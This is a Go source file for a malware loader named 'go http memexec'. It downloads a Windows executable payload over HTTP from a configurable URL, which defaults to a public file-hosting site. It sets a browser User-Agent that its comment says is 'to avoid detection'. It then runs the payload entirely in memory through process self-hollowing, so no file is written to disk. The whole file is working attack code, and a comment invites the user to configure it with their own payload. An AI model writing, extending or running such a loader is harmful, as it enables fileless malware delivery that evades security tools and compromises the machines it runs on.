package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	runpe "runpe/gorunpe"
)

const (
	// Default URL to download from if none provided, configure this before build to point to your payload to avoid passing CLI flags on run

	defaultDownloadURL = "https://tmpfiles.org/"
	
	projectName = "go http memexec"
	version     = "1.0.0"
)

func main() {

	// Determine downloadURL based on command-line arguments
	var downloadURL string
	if len(os.Args) < 2 {

		downloadURL = defaultDownloadURL
		fmt.Printf("No download URL provided via command line. Using default: %s\n", defaultDownloadURL)
	} else {

		downloadURL = os.Args[1]
		// Basic URL validation
		if !strings.HasPrefix(downloadURL, "http://") && !strings.HasPrefix(downloadURL, "https://") {
			log.Fatalf("Invalid URL format. Please provide a URL starting with http:// or https://")
		}
	}

	// http client to download the payload 
	client := &http.Client{
		Timeout: 30 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			// allow up to 10 redirects
			if len(via) >= 10 {
				return fmt.Errorf("too many redirects")
			}
			return nil
		},
	}
	
	// create the HTTP request with a standard user agent
	req, err := http.NewRequest("GET", downloadURL, nil)
	if err != nil {
		log.Fatalf("Failed to create HTTP request: %v", err)
	}
	
	// set a common User-Agent to avoid detection
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36")
	
	// Send the HTTP request
	resp, err := client.Do(req)
	if err != nil {
		log.Fatalf("Failed to download payload: %v", err)
	}
	defer resp.Body.Close()
	
	// Check for successful HTTP status code
	if resp.StatusCode != http.StatusOK {
		log.Fatalf("HTTP request failed with status code: %d", resp.StatusCode)
	}
	
	// Read the payload into memory
	payload, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatalf("Failed to read payload: %v", err)
	}
	
	// Validate we actually got data
	if len(payload) < 512 {
		log.Fatalf("Downloaded payload is too small (%d bytes). Not a valid PE file.", len(payload))
	}
	
	fmt.Printf("Downloaded %d bytes successfully into memory\n", len(payload))
	
	// NOTE:  At this point, the payload exists ONLY in memory
	// No temporary files were created during the download process
	
	// Execute the payload in memory using process self-hollowing
	fmt.Println("Executing payload in memory...")
	err = runpe.ExecuteInMemory(payload)
	if err != nil {
		log.Fatalf("In-memory execution failed: %v", err)
	}
	
	// If the program reaches here, it means the payload either:
	// 1) Executed but returned control
	// 2) Failed to fully hijack the process
	// Most successful executions will never reach this point as the original process is replaced
	fmt.Println("Self-hollowing process completed. If you see this message, the payload may have finished executing or failed to take control.")
}